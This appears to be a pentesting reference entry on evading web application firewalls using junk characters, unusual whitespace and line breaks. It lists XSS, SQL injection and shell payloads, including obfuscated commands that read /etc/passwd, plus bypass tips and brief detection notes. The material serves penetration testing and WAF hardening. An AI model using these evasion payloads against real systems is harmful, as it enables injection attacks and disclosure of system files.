---
id: WAF-EVASION-10
title: Junk Characters, Line Breaks & Whitespace
category: Evasion Techniques
severity_range: Low-Medium
owasp_ref: https://github.com/0xInfection/Awesome-WAF
---

# WAF-EVASION-10: Junk Characters, Line Breaks & Whitespace

## Summary

Inserting junk characters, unconventional whitespace, and line breaks within payloads can disrupt WAF regex patterns while remaining valid to the target parser. Javascript, SQL, and shell interpreters often tolerate whitespace variations, tab characters, and even some non-printable characters in specific contexts.

## When to Use

- Against WAFs with strict regex patterns that assume standard whitespace or no whitespace
- When the target parser is lenient about whitespace and non-printable characters
- To bypass filters that normalize whitespace only for common characters (space, tab, newline)
- Against WAFs that truncate or mangle payloads at line break boundaries

## Technique Details

**Whitespace variations** include: space, horizontal tab (`%09`), vertical tab (`%0B`), form feed (`%0C`), carriage return (`%0D`), and newline (`%0A`). Some parsers accept all of these as whitespace separators.

**Uninitialized variables** in bash (`$u`) evaluate to empty strings, effectively rendering them invisible in the final command while breaking up keyword matching.

**Arithmetic obfuscation** uses leading operators (`+-1`) to confuse string matching — the JavaScript parser safely ignores the operators before the actual code.

## Payload Examples

```javascript
// Arithmetic junk characters
+-+-1-+-+alert(1)
+alert(1)
!alert(1)
~alert(1)
void(alert(1))
--1?alert(1):0

// Line breaks within code
alert\
(1)

%0A
a%0Al%0Ae%0Ar%0At(1)

// Tab characters between code elements
alert	(	1	)
```

```sql
-- Whitespace in SQL keywords
SEL%09ECT * FROM users
SEL%0BECT * FROM users
SEL%0CECT%0DFROM users

-- Mixed whitespace
SELECT%0A*%0DFROM%09users%0BWHERE id=1

-- Tab as separator
1	UNION	SELECT	1,2,3
```

```bash
# Uninitialized variables in shell
$u/bin$u/cat$u /etc$u/passwd
# Expands to: /bin/cat /etc/passwd

$u""$u""$u/bin/bash
# Expands to: /bin/bash

# Empty parameter expansion
${x}cat${y} /etc${z}/passwd
```

```http
# HTTP request with line breaks in payload
GET /search?q=%0A%3Cscript%3E%0Aalert(1)%0A%3C/script%3E HTTP/1.1
Host: target.com
```

## Detection & Bypass Notes

**Detection:**
- WAFs that normalize all whitespace to a single space before matching are resistant.
- Replacing unusual whitespace characters with standard space as a preprocessing step defeats this technique.
- Some WAFs strip null bytes and non-printable characters entirely.

**Bypass:**
- Use `%0A` (newline) at the start of HTTP request parameters to push the payload past initial pattern matching.
- Combine with other techniques: `%0BUNION%0BSELECT%0B` (vertical tab + SQL case toggling).
- For XSS, use HTML entity encoded whitespace: `&#32;alert&#x20;(1)`.
- In multipart form data, different boundary parsing may handle whitespace differently.
- Vertical tab (`%0B`) is particularly effective as it's often overlooked in WAF regex patterns.

## References

- https://github.com/0xInfection/Awesome-WAF
- https://owasp.org/www-community/attacks/xss/
- https://portswigger.net/web-security/sql-injection
